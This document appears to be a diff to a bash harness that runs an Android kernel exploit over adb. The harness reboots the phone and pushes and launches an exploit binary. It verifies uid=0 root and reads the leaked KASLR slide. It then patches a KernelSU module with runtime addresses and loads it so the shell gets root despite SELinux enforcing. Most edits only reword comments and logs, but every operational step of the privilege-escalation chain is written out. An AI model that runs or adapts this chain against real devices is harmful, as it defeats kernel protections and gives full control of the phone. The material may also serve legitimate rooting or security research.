@@ -2,6 +2,7 @@
 
 set -o pipefail
 
+# The adb command is required
 if ! command -v adb >/dev/null 2>&1; then
   echo "Error: 'adb' not found in PATH. Install Android platform-tools and set ADB env variable." >&2
   exit 1
@@ -22,14 +23,14 @@ KERNEL_SYMBOLS="${BASE_DIR}/third_party/kernel-symbols"
 
 log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" >&2; }
 
-# redirect the whole script's output
+# Redirect the whole script's output to log file
 exec > >(tee -a "$LOG") 2>&1
 
-# 1. reboot for a cold-boot run
+# 1. Reboot for a cold-boot run
 log "Rebooting smartphone..."
 "$ADB" reboot
 
-# wait for the device to go down, so a stale boot_completed=1 isn't read
+# Wait for the device to go down, so a stale boot_completed=1 isn't read
 down=0
 for i in {1..30}; do
   if ! "$ADB" get-state >/dev/null 2>&1; then down=1; break; fi
@@ -38,12 +39,12 @@ done
 [ "$down" = 1 ] || { log "Device did not go down after reboot. Exit script."; exit 1; }
 log "Device is down, waiting for boot..."
 
-# wait for the device to come back and finish booting
+# Wait for the device to come back and finish booting
 ok=0
 for i in {1..120}; do
   sleep 2
-  b=$("$ADB" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
-  a=$("$ADB" shell getprop init.svc.bootanim 2>/dev/null | tr -d '\r')
+  b=$("$ADB" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r' || true)
+  a=$("$ADB" shell getprop init.svc.bootanim 2>/dev/null | tr -d '\r' || true)
   if [ "$b" = "1" ] && [ "$a" = "stopped" ]; then ok=1; log "Reboot completed."; break; fi
 done
 [ "$ok" = 1 ] || { log "BOOT TIMEOUT. Exit script."; exit 1; }
@@ -53,7 +54,7 @@ sleep 5
 log "Done."
 
 
-# 2. push fresh binaries (remove first so a running/busy file can't block the overwrite)
+# 2. Push fresh binaries, make executable, remove old log
 push() {
     local src=$1 dst=$2 out rc
     "$ADB" shell "rm -f $dst"
@@ -64,22 +65,14 @@ push() {
 }
 
 log "Pushing exploit and helper to the device..."
-
-log "Exploit: from <$APP_SRC> to <$APP_DST>"
 push "$APP_SRC"    "$APP_DST"    || exit 1
-
-log "Helper: from  <$HELPER_SRC> to <$HELPER_DST>"
 push "$HELPER_SRC" "$HELPER_DST" || exit 1
 
-
-# make sure the helper is executable on the device
 "$ADB" shell "chmod 755 $HELPER_DST"
-
-# remove the old exploit log
-timeout 15 "$ADB" shell "rm -f ${REMOTE_EXPLOIT_LOG}"
+"$ADB" shell "rm -f ${REMOTE_EXPLOIT_LOG}"
 
 
-# 3. launch the exploit on the smartphone
+# 3. Launch the exploit on the device
 launch() {
     local out err rc
     err=$(mktemp)
@@ -95,7 +88,7 @@ launch &
 launch_pid=$!
 
 
-# 4. wait until the exploit finishes its work
+# 4. Wait until the exploit finishes its work
 # wait_for_log PATTERN [TIMEOUT_SEC]
 # returns 0 = found, 1 = timeout, 2 = launcher exited without the pattern
 wait_for_log() {
@@ -111,7 +104,7 @@ wait_for_log() {
   return 1
 }
 
-log "Waiting for 'constructor returned' in exploit log: <$REMOTE_EXPLOIT_LOG>..."
+log "Waiting for the 'constructor returned' pattern in exploit log..."
 wait_for_log "constructor returned" 180
 case $? in
   0) log "App constructor returned." ;;
@@ -127,28 +120,27 @@ log "Exploit finished. Post-run steps..."
 "$ADB" pull "${REMOTE_EXPLOIT_LOG}" "${LOCAL_EXPLOIT_LOG}"
 
 
-# 5. verify root + read the KASLR slide printed by the payload
+# 5. Verify root + read the KASLR slide printed by the payload
 out=$("$ADB" shell '/apex/com.android.virt/bin/su "id; getenforce"')
-log "root check: $out"
+log "Verified root: $out"
 echo "$out" | grep -q "uid=0(root)" || { log "NO ROOT"; exit 2; }
 
 slidehex=$(grep -o 'slide=0*[0-9a-f]*' ${LOCAL_EXPLOIT_LOG} 2>/dev/null | tail -1 | cut -d= -f2)
-log "slide from exploit log: $slidehex"
+log "The slide from exploit log: $slidehex"
 [ -n "$slidehex" ] || { log "NO SLIDE"; exit 3; }
 
 
-# 6. patch the KSUN LKM: undefined imports -> SHN_ABS with runtime addresses
+# 6. Patch the KSUN LKM: undefined imports -> SHN_ABS with runtime addresses
 log "Patching the kernel module..."
-log "Command: ${BASE_DIR}/tools/patcher.sh ${KERNELSU_MODULES}/android14-6.1_kernelsu_v3.3.0.ko ${KERNELSU_MODULES}/kernelsu-patched.ko ${KERNEL_SYMBOLS}/akita-CP2A.260805.005.ksym.tsv ${slidehex}"
 ${BASE_DIR}/tools/patcher.sh ${KERNELSU_MODULES}/android14-6.1_kernelsu_v3.3.0.ko ${KERNELSU_MODULES}/kernelsu-patched.ko ${KERNEL_SYMBOLS}/akita-CP2A.260805.005.ksym.tsv ${slidehex}
-log "Done. Patched module: <${KERNELSU_MODULES}/kernelsu-patched.ko>"
+log "The kernel module has been patched."
 
 
 # 7. push + insmod with allow_shell=1 (shell gets root via KSU)
-log "Pushing patched module to <${REMOTE_DIR}/kernelsu-patched.ko>..."
+log "Pushing patched module..."
 "$ADB" push "${KERNELSU_MODULES}/kernelsu-patched.ko" "${REMOTE_DIR}/kernelsu-patched.ko" >/dev/null
 
-log "Pushing <ksud-pixel> to <${REMOTE_DIR}/ksud-pixel>"
+log "Pushing ksud-pixel..."
 "$ADB" push "${BASE_DIR}/third_party/kernelsu-next/bin/ksud-pixel" "${REMOTE_DIR}/ksud-pixel" >/dev/null
 "$ADB" shell "chmod 755 ${REMOTE_DIR}/ksud-pixel"
 
@@ -159,7 +151,7 @@ log "The <insmod allow_shell=1> command output: $ins"
 echo "$ins" | grep -q "rc=0" || exit 5
 
 
-# 8. verify: module live + root via <ksud-pixel su> works even with SELinux enforcing
+# 8. Verify: module live + root via <ksud-pixel su> works even with SELinux enforcing
 sleep 2
 mod=$("$ADB" shell "grep kernelsu /proc/modules")
 log "Verifying the <kernelsu> module on the device: $mod"
